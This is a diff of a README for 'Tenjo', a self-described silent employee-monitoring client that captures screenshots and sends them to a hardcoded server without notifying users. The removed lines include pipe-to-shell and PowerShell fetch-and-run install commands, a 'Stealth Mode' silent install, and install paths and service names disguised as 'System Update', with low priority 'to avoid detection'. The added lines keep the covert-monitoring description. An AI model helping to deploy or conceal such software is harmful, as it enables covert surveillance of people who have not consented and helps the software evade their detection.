@@ -3,31 +3,29 @@
 ## Overview
 Silent employee monitoring system that runs in background without user notification.
 
-## 🚀 **One-Line Installation (Recommended)**
+## 🚀 **Quick Start**
 
-### Windows (Run as Administrator)
-```cmd
-powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/install.bat' -OutFile 'install.bat'; .\install.bat"
-```
+### Windows
+1. **Download** client files or clone repository
+2. **Navigate** to client directory
+3. **Run** `simple_start_windows.bat`
 
 ### macOS
-```bash
-curl -sSL https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/install.sh | bash
-```
+1. **Download** client files or clone repository
+2. **Navigate** to client directory  
+3. **Run** `./simple_start_macos.sh`
 
-## 📦 **Alternative: Download and Run**
+## 📦 **What the Scripts Do**
 
-### Windows Installation
-1. **Download** `easy_install_windows.bat` from GitHub
-2. **Right-click** → "Run as administrator"
-3. **Enter** your dashboard server URL
-4. **Wait** for installation to complete
+The startup scripts will automatically:
+- ✅ Check Python 3 installation
+- ✅ Install required dependencies (requests, mss, psutil, pillow)
+- ✅ Display current configuration
+- ✅ Start the monitoring client
 
-### macOS Installation  
-1. **Download** `easy_install_macos.sh` from GitHub
-2. **Open Terminal** and run:
-```bash
-chmod +x easy_install_macos.sh
+## 📋 **Manual Installation**
+
+If you prefer manual setup:
 ./easy_install_macos.sh
 ```
 3. **Enter** your dashboard server URL
@@ -51,33 +49,27 @@ chmod +x easy_install_macos.sh
 - 📡 **Silent data transmission** to dashboard server
 - 🔧 **Enhanced logging** with rotating log files
 
-## 🗑️ **Easy Uninstallation**
+## 🗑️ **Stopping the Client**
 
-### Windows Uninstall (Run as Administrator)
-```cmd
-powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/uninstall_windows.bat' -OutFile 'uninstall.bat'; .\uninstall.bat"
-```
+Simply press `Ctrl+C` in the terminal where the client is running, or close the terminal window.
 
-### macOS Uninstall
-```bash
-curl -sSL https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/uninstall_macos.sh | bash
-```
+For permanent removal:
+- **Windows**: Delete the client folder
+- **macOS**: Delete the client folder
 
 ## Technical Details
 
-### Installation Locations
-- **Windows**: `%APPDATA%\SystemUpdate`
-- **macOS**: `~/.system_update`
-
-### Auto-Start Configuration
-- **Windows**: Windows Task Scheduler (`system_update_service`)
-- **macOS**: LaunchAgent (`com.system.update.service`)
+### Configuration
+- **Client ID**: Automatically generated based on hardware fingerprint
+- **Server**: http://103.129.149.67 (configurable in `src/core/config.py`)
+- **Screenshot Interval**: 60 seconds (configurable)
+- **Dependencies**: requests, mss, psutil, pillow
 
 ### Process Information
-- **Service Name**: "System Update Service"
-- **Priority**: Low (to avoid detection)
+- **Service Name**: "Tenjo Client"
 - **Network**: Communicates with dashboard server
-- **Dependencies**: Auto-installs Python packages as needed
+- **Storage**: Screenshots and logs stored locally
+- **Cross-Platform**: Works on Windows and macOS
 
 ## Server Configuration
 
@@ -90,32 +82,15 @@ curl -sSL https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/unin
 **Windows:**
 ```cmd
 easy_install_windows.bat
-# Enter custom URL when prompted: http://103.129.149.67
-```
-
-**macOS:**
-```bash
-./easy_install_macos.sh
-# Enter custom URL when prompted: http://103.129.149.67
-```
-
-## Advanced Installation (Stealth Mode)
-
-For completely silent installation without user interaction:
-
-### Windows Silent Install
-```cmd
-install_windows.bat http://103.129.149.67
-```
-
-### macOS Silent Install
-```bash
-./install_macos.sh http://103.129.149.67
-```
+### Custom Server Configuration
+Edit `src/core/config.py` to change:
+- Server URL
+- Screenshot interval  
+- Other settings
 
 ## Advanced Service Management
 
-The client now includes a comprehensive startup script (`tenjo_startup.py`) with enhanced features:
+The client includes a comprehensive startup script (`tenjo_startup.py`) with enhanced features:
 
 ### **Manual Service Control**
 ```bash
